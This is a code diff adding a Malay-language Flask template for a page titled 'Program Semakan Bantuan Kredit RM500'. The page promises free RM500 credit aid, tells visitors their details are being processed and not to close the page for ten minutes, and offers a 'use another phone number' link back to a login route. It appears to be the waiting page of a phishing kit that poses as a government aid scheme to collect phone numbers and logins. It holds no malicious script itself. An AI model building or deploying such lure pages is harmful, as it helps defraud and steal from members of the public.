@@ -1,0 +1,208 @@
+{% extends "layout.html" %} {% block content %}
+
+<div class="ui-container">
+
+  <!-- 🔵 HERO / BANNER -->
+  <div class="ui-banner">
+    <div class="ui-banner-text">
+      <p class="ui-small">
+        Program Semakan Bantuan Kredit RM500
+      </p>
+
+      <div class="ui-amount">
+        <span class="ui-rm">RM</span>
+        <span class="ui-value">500.00</span>
+      </div>
+
+      <div class="ui-marquee">
+        <span>⚠️ SILA ISI MAKLUMAT ANDA DENGAN BETUL DI BAWAH</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ⚪ STATUS CARD -->
+  <div class="ui-card">
+    <div class="ui-badge">
+      <span class="ui-dot"></span>
+      PERCUMA
+    </div>
+
+    <h2 class="ui-title">SEMAKAN STATUS</h2>
+
+    <p class="ui-desc">
+      Sila isi borang di bawah dengan betul bagi tujuan semakan dan
+      maklumat lanjut permohonan anda.
+    </p>
+  </div>
+
+</div>
+
+<style>
+/* CONTAINER */
+.ui-container {
+  max-width: 420px;
+  margin: auto;
+  padding: 16px;
+  background: #f3f4f6;
+  box-sizing: border-box;
+}
+
+/* BANNER */
+.ui-banner {
+  width: 100%;
+  height: 220px;
+  border-radius: 24px;
+  background: linear-gradient(135deg, #2b5fb8, #3f86ff);
+  display: flex;
+  align-items: center;
+  justify-content: flex-end;
+  padding: 20px;
+  margin-bottom: 20px; /* 🔥 penting biar ga nempel */
+  box-sizing: border-box;
+  box-shadow: 0 10px 25px rgba(0,0,0,0.15);
+}
+
+.ui-banner-text {
+  text-align: right;
+  color: #fff;
+  width: 100%;
+}
+
+.ui-small {
+  font-size: 14px;
+  margin-bottom: 10px;
+}
+
+/* AMOUNT */
+.ui-amount {
+  display: flex;
+  justify-content: flex-end;
+  align-items: baseline;
+  gap: 6px;
+}
+
+.ui-rm {
+  font-size: 18px;
+  font-weight: 600;
+}
+
+.ui-value {
+  font-size: 46px;
+  font-weight: 800;
+}
+
+/* MARQUEE */
+.ui-marquee {
+  margin-top: 10px;
+  overflow: hidden;
+  white-space: nowrap;
+}
+
+.ui-marquee span {
+  display: inline-block;
+  padding-left: 100%;
+  animation: uiScroll 10s linear infinite;
+  font-size: 13px;
+}
+
+@keyframes uiScroll {
+  0% { transform: translateX(0); }
+  100% { transform: translateX(-100%); }
+}
+
+/* CARD */
+.ui-card {
+  width: 100%;
+  background: #e5e7eb;
+  padding: 30px 20px;
+  border-radius: 28px;
+  text-align: center;
+  box-sizing: border-box;
+}
+
+/* BADGE */
+.ui-badge {
+  display: inline-flex;
+  align-items: center;
+  background: #d1fae5;
+  color: #065f46;
+  padding: 6px 14px;
+  border-radius: 999px;
+  font-size: 13px;
+  font-weight: 700;
+  margin-bottom: 15px;
+}
+
+.ui-dot {
+  width: 8px;
+  height: 8px;
+  background: #22c55e;
+  border-radius: 50%;
+  margin-right: 6px;
+}
+
+/* TEXT */
+.ui-title {
+  font-size: 26px;
+  font-weight: 800;
+  color: #0f2a44;
+  margin-bottom: 10px;
+  letter-spacing: 2px;
+}
+
+.ui-desc {
+  font-size: 14px;
+  color: #4b5563;
+  line-height: 1.7;
+}
+</style>
+
+<!-- Gambar proses -->
+<img
+  id="loadingGif"
+  src="{{ url_for('static', filename='processing.gif') }}"
+  alt="Loading..."
+  style="margin: 0 auto 20px; width: 100px; height: 100px; display: block"
+/>
+
+<p
+  id="formMessage"
+  style="
+    font-size: 16px;
+    color: #2c3e50;
+    font-weight: 500;
+    line-height: 1.6;
+    margin-bottom: 20px;
+    text-align: justify;
+  "
+>
+  ✅ Maklumat anda telah
+  <strong style="color: green">diterima</strong> dan kini sedang diproses.
+  <br />Sila tunggu sementara sistem kami menjalankan semakan kelayakan bagi
+  <strong>anda.</strong> anda. <br /><br />Tempoh pemprosesan adalah dalam
+  lingkungan 10 minit. Mohon jangan tutup atau muat semula halaman ini untuk
+  mengelakkan gangguan proses.
+</p>
+<a
+  href="{{ url_for('login') }}"
+  style="
+    display: block; /* bikin <a> jadi block */
+    width: 80%; /* kasih lebar biar bisa di-center */
+    padding: 12px;
+    background-color: #123bf3;
+    color: white;
+    text-align: center; /* teks di tengah */
+    border: none;
+    border-radius: 8px;
+    font-size: 1rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+    box-shadow: 0 4px 12px rgba(243, 156, 18, 0.2);
+    margin: 20px auto; /* ini yang bikin rata tengah */
+  "
+>
+  Guna Nombor Telepon Lain
+</a>
+
+{% endblock %}
